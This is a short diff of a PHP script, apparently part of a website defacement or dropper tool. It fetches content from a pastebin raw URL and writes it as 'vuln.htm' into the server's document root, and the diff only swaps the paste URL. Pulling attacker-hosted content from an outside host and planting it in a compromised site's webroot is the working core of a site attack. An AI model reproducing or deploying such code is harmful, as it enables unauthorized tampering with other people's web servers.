@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://pastebin.com/raw/880ufaWF');
+$text2 = http_get('https://pastebin.com/raw/6sAuWJcG');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
